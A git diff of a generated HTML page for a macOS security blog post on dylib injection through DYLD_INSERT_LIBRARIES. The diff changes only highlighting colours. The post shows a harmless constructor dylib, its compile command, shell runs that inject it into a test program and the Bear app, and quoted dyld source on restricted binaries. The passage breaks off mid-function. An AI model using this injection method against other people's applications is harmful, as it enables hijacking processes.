@@ -55,7 +55,7 @@ And a few similar ones, and I will be honest, I had no idea what is he talking a
 
   
   
-  <link rel="stylesheet" href="https://theevilbit.github.io/css/coder.min.b886fe0d9034709648f91f4ce178f51dd367d9350f82dd1132d54fd69bfca66f.css" integrity="sha256-uIb&#43;DZA0cJZI&#43;R9M4Xj1HdNn2TUPgt0RMtVP1pv8pm8=" crossorigin="anonymous" media="screen" />
+  <link rel="stylesheet" href="https://theevilbit.github.io/css/coder.min.4410e480b3bad72c110a96b56e5aa8c36c24a0f3735b278818123b0fa4393fcd.css" integrity="sha256-RBDkgLO61ywRCpa1blqow2wkoPNzWyeIGBI7D6Q5P80=" crossorigin="anonymous" media="screen" />
 
 
 
@@ -218,25 +218,25 @@ And a few similar ones, and I will be honest, I had no idea what is he talking a
               Note that this has no effect on images built a two-level  namespace  images  using  a  dynamic
               shared library unless DYLD_FORCE_FLAT_NAMESPACE is also used.
 </code></pre><p>In short, it will load any dylibs  you specify in this variable before the program loads, essentially injecting a dylib into the application. Let’s try it! I took my previous dylib code I used when playing with dylib hijacking:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;syslog.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__attribute__</span>((constructor))
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">customConstructor</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#099">#include</span> <span style="color:#099">&lt;stdio.h&gt;</span><span style="color:#099">
+</span></span></span><span style="display:flex;"><span><span style="color:#099">#include</span> <span style="color:#099">&lt;syslog.h&gt;</span><span style="color:#099">
+</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>
+</span></span><span style="display:flex;"><span><span style="color:#c0f">__attribute__</span>((constructor))
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">static</span> <span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">customConstructor</span>(<span style="color:#078;font-weight:bold">int</span> argc, <span style="color:#069;font-weight:bold">const</span> <span style="color:#078;font-weight:bold">char</span> <span style="color:#555">**</span>argv)
 </span></span><span style="display:flex;"><span> {
-</span></span><span style="display:flex;"><span>     <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Hello from dylib!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>     <span style="color:#a6e22e">syslog</span>(LOG_ERR, <span style="color:#e6db74">&#34;Dylib injection successful in %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, argv[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span>     <span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;Hello from dylib!</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
+</span></span><span style="display:flex;"><span>     <span style="color:#c0f">syslog</span>(LOG_ERR, <span style="color:#c30">&#34;Dylib injection successful in %s</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>, argv[<span style="color:#f60">0</span>]);
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>Compile:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -dynamiclib inject.c -o inject.dylib
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -dynamiclib inject.c -o inject.dylib
 </span></span></code></pre></div><p>For a quick test I made a sophisticated hello world C code, and tried it with that. In order to set the environment variable for the application to be executed, you need to specify <code>DYLD_INSERT_LIBRARIES=[path to your dylib]</code> in the command line. Here is how it looks like:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./test 
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./test 
 </span></span><span style="display:flex;"><span>Hello world
-</span></span><span style="display:flex;"><span>$ DYLD_INSERT_LIBRARIES<span style="color:#f92672">=</span>inject.dylib ./test
+</span></span><span style="display:flex;"><span>$ <span style="color:#033">DYLD_INSERT_LIBRARIES</span><span style="color:#555">=</span>inject.dylib ./test
 </span></span><span style="display:flex;"><span>Hello from dylib!
 </span></span><span style="display:flex;"><span>Hello world
 </span></span></code></pre></div><p>Executing my favourite note taker application, Bear (where I’m writing this right now) is also affected:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ DYLD_INSERT_LIBRARIES<span style="color:#f92672">=</span>inject.dylib /Applications/Bear.app/Contents/MacOS/Bear 
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ <span style="color:#033">DYLD_INSERT_LIBRARIES</span><span style="color:#555">=</span>inject.dylib /Applications/Bear.app/Contents/MacOS/Bear 
 </span></span><span style="display:flex;"><span>Hello from dylib!
 </span></span></code></pre></div><p>We can also see all these events in the log (as our dylib puts there a message):</p>
 <p><img src="https://theevilbit.github.io/images/DYLD_INSERT_LIBRARIES_DYLIB_injection_in_macOS_OSX_deep_dive/Screenshot%202019-07-08%20at%2016.53.29.png" alt="image"></p>
@@ -252,183 +252,183 @@ And a few similar ones, and I will be honest, I had no idea what is he talking a
 </ol>
 <p>We can actually see this in the source code of dyld - this is an older version, but it’s also more readable: <a href="https://opensource.apple.com/source/dyld/dyld-210.2.3/src/dyld.cpp"  class="external-link" target="_blank" rel="noopener">https://opensource.apple.com/source/dyld/dyld-210.2.3/src/dyld.cpp</a></p>
 <p>The function <code>pruneEnvironmentVariables</code> will remove the environment variables:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">pruneEnvironmentVariables</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> envp[], <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">***</span> applep)
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">static</span> <span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">pruneEnvironmentVariables</span>(<span style="color:#069;font-weight:bold">const</span> <span style="color:#078;font-weight:bold">char</span><span style="color:#555">*</span> envp[], <span style="color:#069;font-weight:bold">const</span> <span style="color:#078;font-weight:bold">char</span><span style="color:#555">***</span> applep)
 </span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// delete all DYLD_* and LD_LIBRARY_PATH environment variables
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">int</span> removedCount <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">**</span> d <span style="color:#f92672">=</span> envp;
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">**</span> s <span style="color:#f92672">=</span> envp; <span style="color:#f92672">*</span>s <span style="color:#f92672">!=</span> NULL; s<span style="color:#f92672">++</span>) {
-</span></span><span style="display:flex;"><span>	    <span style="color:#66d9ef">if</span> ( (<span style="color:#a6e22e">strncmp</span>(<span style="color:#f92672">*</span>s, <span style="color:#e6db74">&#34;DYLD_&#34;</span>, <span style="color:#ae81ff">5</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">strncmp</span>(<span style="color:#f92672">*</span>s, <span style="color:#e6db74">&#34;LD_LIBRARY_PATH=&#34;</span>, <span style="color:#ae81ff">16</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) ) {
-</span></span><span style="display:flex;"><span>			<span style="color:#f92672">*</span>d<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>s;
+</span></span><span style="display:flex;"><span>	<span style="color:#09f;font-style:italic">// delete all DYLD_* and LD_LIBRARY_PATH environment variables
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>	<span style="color:#078;font-weight:bold">int</span> removedCount <span style="color:#555">=</span> <span style="color:#f60">0</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">const</span> <span style="color:#078;font-weight:bold">char</span><span style="color:#555">**</span> d <span style="color:#555">=</span> envp;
+</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">for</span>(<span style="color:#069;font-weight:bold">const</span> <span style="color:#078;font-weight:bold">char</span><span style="color:#555">**</span> s <span style="color:#555">=</span> envp; <span style="color:#555">*</span>s <span style="color:#555">!=</span> <span style="color:#366">NULL</span>; s<span style="color:#555">++</span>) {
+</span></span><span style="display:flex;"><span>	    <span style="color:#069;font-weight:bold">if</span> ( (<span style="color:#c0f">strncmp</span>(<span style="color:#555">*</span>s, <span style="color:#c30">&#34;DYLD_&#34;</span>, <span style="color:#f60">5</span>) <span style="color:#555">!=</span> <span style="color:#f60">0</span>) <span style="color:#555">&amp;&amp;</span> (<span style="color:#c0f">strncmp</span>(<span style="color:#555">*</span>s, <span style="color:#c30">&#34;LD_LIBRARY_PATH=&#34;</span>, <span style="color:#f60">16</span>) <span style="color:#555">!=</span> <span style="color:#f60">0</span>) ) {
+</span></span><span style="display:flex;"><span>			<span style="color:#555">*</span>d<span style="color:#555">++</span> <span style="color:#555">=</span> <span style="color:#555">*</span>s;
 </span></span><span style="display:flex;"><span>		}
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>			<span style="color:#f92672">++</span>removedCount;
-</span></span><span style="display:flex;"><span>		}
-</span></span><span style="display:flex;"><span>	}
-</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>d<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> NULL;
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> ( removedCount <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> ) {
-</span></span><span style="display:flex;"><span>		dyld<span style="color:#f92672">::</span><span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;dyld: DYLD_ environment variables being ignored because &#34;</span>);
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">switch</span> (sRestrictedReason) {
-</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">case</span> restrictedNot:
-</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">break</span>;
-</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">case</span> restrictedBySetGUid:
-</span></span><span style="display:flex;"><span>				dyld<span style="color:#f92672">::</span><span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;main executable (%s) is setuid or setgid</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, sExecPath);
-</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">break</span>;
-</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">case</span> restrictedBySegment:
-</span></span><span style="display:flex;"><span>				dyld<span style="color:#f92672">::</span><span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;main executable (%s) has __RESTRICT/__restrict section</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, sExecPath);
-</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">break</span>;
-</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">case</span> restrictedByEntitlements:
-</span></span><span style="display:flex;"><span>				dyld<span style="color:#f92672">::</span><span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;main executable (%s) is code signed with entitlements</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, sExecPath);
-</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">else</span> {
+</span></span><span style="display:flex;"><span>			<span style="color:#555">++</span>removedCount;
 </span></span><span style="display:flex;"><span>		}
 </span></span><span style="display:flex;"><span>	}
-</span></span><span style="display:flex;"><span>	
-</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// slide apple parameters
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> ( removedCount <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> ) {
-</span></span><span style="display:flex;"><span>		<span style="color:#f92672">*</span>applep <span style="color:#f92672">=</span> d;
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">do</span> {
-</span></span><span style="display:flex;"><span>			<span style="color:#f92672">*</span>d <span style="color:#f92672">=</span> d[removedCount];
-</span></span><span style="display:flex;"><span>		} <span style="color:#66d9ef">while</span> ( <span style="color:#f92672">*</span>d<span style="color:#f92672">++</span> <span style="color:#f92672">!=</span> NULL );
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> removedCount; <span style="color:#f92672">++</span>i)
-</span></span><span style="display:flex;"><span>			<span style="color:#f92672">*</span>d<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	<span style="color:#555">*</span>d<span style="color:#555">++</span> <span style="color:#555">=</span> <span style="color:#366">NULL</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">if</span> ( removedCount <span style="color:#555">!=</span> <span style="color:#f60">0</span> ) {
+</span></span><span style="display:flex;"><span>		dyld<span style="color:#555">::</span><span style="color:#c0f">log</span>(<span style="color:#c30">&#34;dyld: DYLD_ environment variables being ignored because &#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">switch</span> (sRestrictedReason) {
+</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">case</span> <span style="color:#99f">restrictedNot</span>:
+</span></span><span style="display:flex;"><span>				<span style="color:#069;font-weight:bold">break</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">case</span> <span style="color:#99f">restrictedBySetGUid</span>:
+</span></span><span style="display:flex;"><span>				dyld<span style="color:#555">::</span><span style="color:#c0f">log</span>(<span style="color:#c30">&#34;main executable (%s) is setuid or setgid</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>, sExecPath);
+</span></span><span style="display:flex;"><span>				<span style="color:#069;font-weight:bold">break</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">case</span> <span style="color:#99f">restrictedBySegment</span>:
+</span></span><span style="display:flex;"><span>				dyld<span style="color:#555">::</span><span style="color:#c0f">log</span>(<span style="color:#c30">&#34;main executable (%s) has __RESTRICT/__restrict section</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>, sExecPath);
+</span></span><span style="display:flex;"><span>				<span style="color:#069;font-weight:bold">break</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">case</span> <span style="color:#99f">restrictedByEntitlements</span>:
+</span></span><span style="display:flex;"><span>				dyld<span style="color:#555">::</span><span style="color:#c0f">log</span>(<span style="color:#c30">&#34;main executable (%s) is code signed with entitlements</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>, sExecPath);
+</span></span><span style="display:flex;"><span>				<span style="color:#069;font-weight:bold">break</span>;
+</span></span><span style="display:flex;"><span>		}
 </span></span><span style="display:flex;"><span>	}
 </span></span><span style="display:flex;"><span>	
-</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// disable framework and library fallback paths for setuid binaries rdar://problem/4589305
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	sEnv.DYLD_FALLBACK_FRAMEWORK_PATH <span style="color:#f92672">=</span> NULL;
-</span></span><span style="display:flex;"><span>	sEnv.DYLD_FALLBACK_LIBRARY_PATH <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	<span style="color:#09f;font-style:italic">// slide apple parameters
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>	<span style="color:#069;font-weight:bold">if</span> ( removedCount <span style="color:#555">&gt;</span> <span style="color:#f60">0</span> ) {
+</span></span><span style="display:flex;"><span>		<span style="color:#555">*</span>applep <span style="color:#555">=</span> d;
+</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">do</span> {
+</span></span><span style="display:flex;"><span>			<span style="color:#555">*</span>d <span style="color:#555">=</span> d[removedCount];
+</span></span><span style="display:flex;"><span>		} <span style="color:#069;font-weight:bold">while</span> ( <span style="color:#555">*</span>d<span style="color:#555">++</span> <span style="color:#555">!=</span> <span style="color:#366">NULL</span> );
+</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">for</span>(<span style="color:#078;font-weight:bold">int</span> i<span style="color:#555">=</span><span style="color:#f60">0</span>; i <span style="color:#555">&lt;</span> removedCount; <span style="color:#555">++</span>i)
+</span></span><span style="display:flex;"><span>			<span style="color:#555">*</span>d<span style="color:#555">++</span> <span style="color:#555">=</span> <span style="color:#366">NULL</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#09f;font-style:italic">// disable framework and library fallback paths for setuid binaries rdar://problem/4589305
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>	sEnv.DYLD_FALLBACK_FRAMEWORK_PATH <span style="color:#555">=</span> <span style="color:#366">NULL</span>;
+</span></span><span style="display:flex;"><span>	sEnv.DYLD_FALLBACK_LIBRARY_PATH <span style="color:#555">=</span> <span style="color:#366">NULL</span>;
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>If we search where the variable <code>sRestrictedReason</code> is set, we arrive to the function <code>processRestricted</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">processRestricted</span>(<span style="color:#66d9ef">const</span> macho_header<span style="color:#f92672">*</span> mainExecutableMH)
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">static</span> <span style="color:#078;font-weight:bold">bool</span> <span style="color:#c0f">processRestricted</span>(<span style="color:#069;font-weight:bold">const</span> macho_header<span style="color:#555">*</span> mainExecutableMH)
 </span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// all processes with setuid or setgid bit set are restricted
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">issetugid</span>() ) {
-</span></span><span style="display:flex;"><span>		sRestrictedReason <span style="color:#f92672">=</span> restrictedBySetGUid;
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> true;
+</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic">// all processes with setuid or setgid bit set are restricted
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    <span style="color:#069;font-weight:bold">if</span> ( <span style="color:#c0f">issetugid</span>() ) {
+</span></span><span style="display:flex;"><span>		sRestrictedReason <span style="color:#555">=</span> restrictedBySetGUid;
+</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">return</span> <span style="color:#366">true</span>;
 </span></span><span style="display:flex;"><span>	}
 </span></span><span style="display:flex;"><span>		
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">uid_t</span> euid <span style="color:#f92672">=</span> <span style="color:#a6e22e">geteuid</span>();
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> ( (euid <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">hasRestrictedSegment</span>(mainExecutableMH) ) {
-</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// existence of __RESTRICT/__restrict section make process restricted
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		sRestrictedReason <span style="color:#f92672">=</span> restrictedBySegment;
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> true;
+</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">const</span> <span style="color:#078;font-weight:bold">uid_t</span> euid <span style="color:#555">=</span> <span style="color:#c0f">geteuid</span>();
+</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">if</span> ( (euid <span style="color:#555">!=</span> <span style="color:#f60">0</span>) <span style="color:#555">&amp;&amp;</span> <span style="color:#c0f">hasRestrictedSegment</span>(mainExecutableMH) ) {
+</span></span><span style="display:flex;"><span>		<span style="color:#09f;font-style:italic">// existence of __RESTRICT/__restrict section make process restricted
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>		sRestrictedReason <span style="color:#555">=</span> restrictedBySegment;
+</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">return</span> <span style="color:#366">true</span>;
 </span></span><span style="display:flex;"><span>	}
 </span></span><span style="display:flex;"><span>	
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#if __MAC_OS_X_VERSION_MIN_REQUIRED    
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// ask kernel if code signature of program makes it restricted
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">uint32_t</span> flags;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">syscall</span>(SYS_csops <span style="color:#75715e">/* 169 */</span>,
-</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">0</span> <span style="color:#75715e">/* asking about myself */</span>,
+</span></span><span style="display:flex;"><span><span style="color:#099">#if __MAC_OS_X_VERSION_MIN_REQUIRED    
+</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>    <span style="color:#09f;font-style:italic">// ask kernel if code signature of program makes it restricted
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    <span style="color:#078;font-weight:bold">uint32_t</span> flags;
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> ( <span style="color:#c0f">syscall</span>(SYS_csops <span style="color:#09f;font-style:italic">/* 169 */</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#f60">0</span> <span style="color:#09f;font-style:italic">/* asking about myself */</span>,
 </span></span><span style="display:flex;"><span>                CS_OPS_STATUS,
-</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&amp;</span>flags,
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">sizeof</span>(flags)) <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (flags <span style="color:#f92672">&amp;</span> CS_RESTRICT) {
-</span></span><span style="display:flex;"><span>			sRestrictedReason <span style="color:#f92672">=</span> restrictedByEntitlements;
-</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> true;
+</span></span><span style="display:flex;"><span>                <span style="color:#555">&amp;</span>flags,
+</span></span><span style="display:flex;"><span>                <span style="color:#069;font-weight:bold">sizeof</span>(flags)) <span style="color:#555">!=</span> <span style="color:#555">-</span><span style="color:#f60">1</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> (flags <span style="color:#555">&amp;</span> CS_RESTRICT) {
+</span></span><span style="display:flex;"><span>			sRestrictedReason <span style="color:#555">=</span> restrictedByEntitlements;
+</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">return</span> <span style="color:#366">true</span>;
 </span></span><span style="display:flex;"><span>		}
 </span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> false;
+</span></span><span style="display:flex;"><span><span style="color:#099">#endif
+</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>    <span style="color:#069;font-weight:bold">return</span> <span style="color:#366">false</span>;
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>This is the code segment that will identify the restricted segment:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">//
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Look for a special segment in the mach header. 
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Its presences means that the binary wants to have DYLD ignore
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// DYLD_ environment variables.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#if __MAC_OS_X_VERSION_MIN_REQUIRED
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">hasRestrictedSegment</span>(<span style="color:#66d9ef">const</span> macho_header<span style="color:#f92672">*</span> mh)
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">//
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Look for a special segment in the mach header. 
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Its presences means that the binary wants to have DYLD ignore
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// DYLD_ environment variables.
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">//
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span><span style="color:#099">#if __MAC_OS_X_VERSION_MIN_REQUIRED
+</span></span></span><span style="display:flex;"><span><span style="color:#099"></span><span style="color:#069;font-weight:bold">static</span> <span style="color:#078;font-weight:bold">bool</span> <span style="color:#c0f">hasRestrictedSegment</span>(<span style="color:#069;font-weight:bold">const</span> macho_header<span style="color:#555">*</span> mh)
 </span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">uint32_t</span> cmd_count <span style="color:#f92672">=</span> mh<span style="color:#f92672">-&gt;</span>ncmds;
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> load_command<span style="color:#f92672">*</span> <span style="color:#66d9ef">const</span> cmds <span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> load_command<span style="color:#f92672">*</span>)(((<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)mh)<span style="color:#f92672">+</span><span style="color:#66d9ef">sizeof</span>(macho_header));
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> load_command<span style="color:#f92672">*</span> cmd <span style="color:#f92672">=</span> cmds;
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">uint32_t</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> cmd_count; <span style="color:#f92672">++</span>i) {
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">switch</span> (cmd<span style="color:#f92672">-&gt;</span>cmd) {
-</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">case</span> LC_SEGMENT_COMMAND:
